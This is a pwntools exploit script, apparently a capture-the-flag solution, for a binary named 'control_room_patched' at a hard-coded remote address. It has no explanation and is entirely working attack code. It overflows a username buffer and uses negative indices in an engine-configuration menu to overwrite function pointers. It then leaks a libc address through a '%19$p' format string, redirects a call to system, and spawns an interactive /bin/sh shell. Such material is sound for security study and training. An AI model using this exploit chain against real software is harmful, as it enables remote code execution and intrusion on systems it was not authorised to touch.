#!/usr/bin/python3

from pwn import *

exe = ELF('control_room_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
    gdb.attach(r, gdbscript='''
        # b*0x000000000040192f
        # b*0x00000000004018bc
        b*0x000000000040201b
        # b*0x0000000000401f05
    ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)

if args.REMOTE:
    r = remote('68.183.45.143', 30234)
else:
    r = process(exe.path)
    GDB()
    
def choice(choice):
    sla(b'\x1B[0m', str(choice).encode())
    
def config_eng(num, thrust, ratio, op):
    choice(1)
    sla(b'', str(num).encode())
    sla(b'Thrust: ', str(thrust).encode())
    sla(b'ratio: ', str(ratio).encode())
    if op != b'n':
        sla(b'> ', op)

    
payload = b'a'*0x100
sa(b'username: ', payload)
sla(b'> ', b'n')    
sla(b'size: ', str(0x100).encode())
sa(b'username: ', b'a'*255)

choice(5)
sla(b'role: ', b'1')

config_eng(-7, exe.sym['user_edit'], 0, b'y')
config_eng(-12, exe.sym['printf'], 0x4010d0, b'y')

choice(0)
sla(b'size: ', b'100')
sla(b'username: ', b'%19$p')
libc.address = int(r.recv(14), 16) - 0x29d90
print(hex(libc.address))

config_eng(-12, libc.sym['system'], 0x4010d0, b'y\x00\x0a')

choice(0)
sla(b'size: ', b'100')
sla(b'username: ', b'/bin/sh\x00')

r.interactive()
